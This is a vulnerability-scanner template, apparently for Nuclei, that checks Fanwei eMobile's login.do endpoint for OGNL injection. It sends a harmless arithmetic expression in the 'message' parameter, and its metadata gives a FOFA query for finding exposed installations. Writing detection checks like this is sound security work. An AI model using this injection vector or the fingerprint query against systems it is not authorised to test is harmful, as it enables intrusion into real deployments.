http:
- matchers:
  - part: body
    type: word
    words:
    - '{{result}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login.do?message={{num1}}*{{num2}}'
  - '{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}'
  stop-at-first-match: true
id: CNVD-2017-03561
info:
  author: ritikchaddha
  description: 'Fanwei eMobile contains an object graph navigation library vulnerability.
    An attacker can inject arbitrary JavaScript, thus possibly obtaining sensitive
    information from a database, modifying data, and executing unauthorized administrative
    operations in the context of the affected site.

    '
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-eMobile\""
    max-request: 2
    verified: true
  name: Fanwei eMobile - OGNL Injection
  reference:
  - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
  - https://reconshell.com/vulnerability-research-list/
  severity: high
  tags: cnvd,cnvd2017,emobile,ognl,fanwei,vuln
variables:
  num1: '{{rand_int(800000, 999999)}}'
  num2: '{{rand_int(800000, 999999)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
